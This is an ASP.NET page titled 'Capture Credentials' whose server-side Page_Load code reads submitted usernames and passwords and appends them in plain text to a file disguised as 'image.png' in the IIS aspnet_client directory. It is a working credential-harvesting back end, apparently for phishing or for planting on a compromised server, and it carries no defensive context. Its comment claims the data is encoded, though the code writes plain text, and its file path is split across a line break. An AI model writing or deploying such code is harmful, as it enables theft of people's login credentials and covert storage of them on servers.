  <%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html>
<head runat="server">
    <title>Capture Credentials</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Label ID="Label1" runat="server" Text="Form submitted."></asp:Label>
        </div>
    </form>

    <%@ Import Namespace="System.IO" %>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {

                // Retrieve username and password from the form
                string username = Request.Form["username"] ?? ""; // Default to empty string if null
                string password = Request.Form["password"] ?? ""; // Default to empty string if null



                // Define the file path to save credentials
                string filePath = @"C:\inetpub\wwwroot\
aspnet_client\system_web\4_0_30319\image.png";

                // Write encoded username and password to a file
                using (StreamWriter writer = new StreamWriter(filePath, true))
                {
                    writer.WriteLine("Username:"+ username + " Password: "+ password);
                }

        }
    </script>
</body>
</html>
 
